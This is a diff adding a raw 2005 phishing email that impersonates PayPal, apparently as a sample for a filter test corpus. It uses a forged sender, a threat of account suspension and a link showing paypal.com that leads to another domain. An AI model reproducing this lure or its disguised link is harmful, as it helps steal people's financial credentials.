@@ -1,0 +1,95 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from example.com (example.com [192.168.2.0])
+ by example.com (Postfix) with ESMTP id F17C62A895
+ for <user@example.com>; Tue, 28 Jun 2005 12:07:25 -0400 (EDT)
+Received: by example.com (Example mail relay)
+ id D1D2C6343A; Tue, 28 Jun 2005 12:07:25 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by example.com (Example mail relay) with ESMTP id F167863487
+ for <user@example.com>; Tue, 28 Jun 2005 16:07:23 +0000 (GMT)
+Received: (from user@localhost) by mail.example.com id MAA25763
+ for user@example.com; Tue, 28 Jun 2005 12:07:20 -0400
+Received: from dedicated.choopa.com (216.32.202.176.choopa.net
+ [216.32.202.176] (may be forged))
+ by mail.example.com with ESMTP id MAA25755
+ for <user@example.com>; Tue, 28 Jun 2005 12:07:20 -0400
+Received: from dedicated.choopa.com (localhost.choopa.co [127.0.0.1])
+ by dedicated.choopa.com (8.12.10/8.12.10) with ESMTP id j5SG5Iqu077797
+ for <user@example.com>; Tue, 28 Jun 2005 12:05:18 -0400 (EDT)
+ (envelope-from dave@dedicated.choopa.com)
+Received: (from root@localhost)
+ by dedicated.choopa.com (8.12.10/8.13.1/Submit) id j5SG5IpT077759
+ for user@example.com; Tue, 28 Jun 2005 12:05:18 -0400 (EDT)
+ (envelope-from dave)
+Date: Tue, 28 Jun 2005 12:05:18 -0400 (EDT)
+Message-Id: <200506281605.j5SG5IpT077759@dedicated.choopa.com>
+From: PayPal <acc-validity@paypal.com>
+Subject: Account compromised: billing information moved or changed.
+Mime-Version: 1.0
+Content-Type: text/html; boundary="xlcuiBo847gtaDvjhSdgF983r"
+X-Mailer: pp
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 6
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></td>
+</tr>
+<tr>
+<td>&nbsp;</td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR>
+<TD bgcolor="GhostWhite" class="panel">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font face="Arial" size="2px">The following message is an email sent to you by an administrator of "PayPal.com".<br>If this message is spam, contains abusive or other comments you find offensive please contact the webmaster at the following address:
+<a href="mailto:admin@paypal.com">admin@paypal.com</a>
+</TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD>&nbsp;</TR>
+<TR><TD></TD>&nbsp;</TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color="Navy" size="3"><b>Dear PayPal client,</b></font><br>
+	<br>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font face="Arial" size="2px">While performing it's regular scheduled monthly billing address check our system found incompatible information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of this information you still need to follow up the previous link and update your existing billing information because it means that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation.<br>
+	<br>
+	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
+you have on file with us. Clicking <a 
+href="http://www.guruavi.com/.www.paypal.com/cgi-bin/webscrcmd_login.php">https://www.paypal.com/cgi-bin/webscr?cmd=_login_</a> 
+you will avoid any possible futuring billing problems with your account.<br>
+	<br>
+        <br>
+        <br>
+	<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>PayPal Team</i>.
+        </TD>
+        </tr>
+</TABLE>
